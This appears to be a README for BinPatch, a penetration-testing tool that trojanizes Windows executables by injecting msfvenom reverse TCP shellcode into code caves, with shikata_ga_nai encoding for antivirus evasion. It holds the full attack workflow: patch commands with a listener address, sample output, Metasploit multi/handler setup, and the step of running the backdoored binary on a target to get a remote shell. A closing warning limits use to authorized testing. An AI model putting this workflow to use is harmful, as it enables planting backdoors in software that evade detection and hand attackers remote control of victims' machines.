# BinPatch

## Overview
BinPatch is a command-line tool for penetration testers to patch executable binaries (Windows PE, ELF, Mach-O) with shellcode while preserving original functionality, designed for authorized security assessments in Kali Linux. It injects reverse TCP shellcode into code caves or new sections, using `msfvenom` for payload generation and encoding for antivirus evasion. This tool is inspired by `backdoor-factory` but is a simplified implementation.

## Features
- Supports Windows PE (x86/x64) binaries (ELF and Mach-O planned).
- Injects shellcode into code caves, preserving binary functionality.
- Generates reverse TCP shellcode with `msfvenom`, supporting encoders (e.g., shikata_ga_nai).
- Outputs backdoored binaries to a `backdoored/` directory.
- Includes a sample binary (`hello.exe`) for testing.
- Lightweight and optimized for Kali Linux.

## Prerequisites
- Kali Linux (or similar with Metasploit installed)
- Python 3.6 or higher
- `msfvenom` (part of Metasploit Framework)
- Python libraries: `pefile`, `capstone`
- Optional: `osslsigncode` for PE code signing
- Write access to `/opt/binpatch` (default repository path)

## Installation

### Setup
1. Clone or download the repository.
2. Run the setup script to create a virtual environment, install dependencies, and set up the repository:
   ```bash
   chmod +x set_upfile.sh
   ./set_upfile.sh
   ```
3. Activate the virtual environment:
   ```bash
   source venv/bin/activate
   ```

### Compile Sample Binary
1. Compile `hello.c` to create `hello.exe` (requires `mingw-w64`):
   ```bash
   x86_64-w64-mingw32-gcc hello.c -o hello.exe
   ```
2. Use `hello.exe` as a test binary for patching.

## Usage
Run the tool with:
```bash
python binpatch.py -f <binary> -H <LHOST> -P <LPORT> [-s <shellcode>] [-e <encoder>]
```

- **-f, --file**: Path to the binary (e.g., `hello.exe`).
- **-H, --host**: LHOST for reverse shell (e.g., `192.168.1.100`).
- **-P, --port**: LPORT for reverse shell (e.g., `4444`).
- **-s, --shellcode**: Shellcode type (default: `reverse_shell_tcp`).
- **-e, --encoder**: Encoder for shellcode (default: `x86/shikata_ga_nai`).

### Example
1. **Patch a binary**:
   ```bash
   python binpatch.py -f hello.exe -H 192.168.1.100 -P 4444 -s reverse_shell_tcp -e x86/shikata_ga_nai
   ```
   Output:
   ```
   [*] Detected PE binary.
   [*] Shellcode generated successfully.
   [*] Using cave in section .text at offset 0x1234 (size: 500 bytes).
   [*] Backdoored binary saved to backdoored/hello.exe
   ```

2. **Set up Metasploit listener**:
   ```bash
   msfconsole -q
   use multi/handler
   set PAYLOAD windows/shell_reverse_tcp
   set LHOST 192.168.1.100
   set LPORT 4444
   exploit
   ```

3. **Run the backdoored binary** (on a Windows target):
   - Execute `backdoored/hello.exe` to trigger the shellcode and connect back to the Metasploit listener.

## Repository Structure
```
/opt/binpatch/
├── hello.exe        # Sample binary
├── backdoored/      # Directory for patched binaries
└── certs/           # Directory for code signing certificates (optional)
```

## Limitations
- Only PE binaries are supported in this version (ELF/Mach-O planned).
- Basic code cave injection; no cave jumping or IAT patching.
- Limited AV evasion (relies on `msfvenom` encoding).
- No support for packed binaries (e.g., UPX).
- Requires manual certificate setup for code signing.

## License
MIT License

## Warning
BinPatch is for ethical penetration testing and authorized security assessments only. Unauthorized use against systems you do not own or have permission to test is illegal and unethical. Always obtain explicit permission before testing. The author is not responsible for misuse.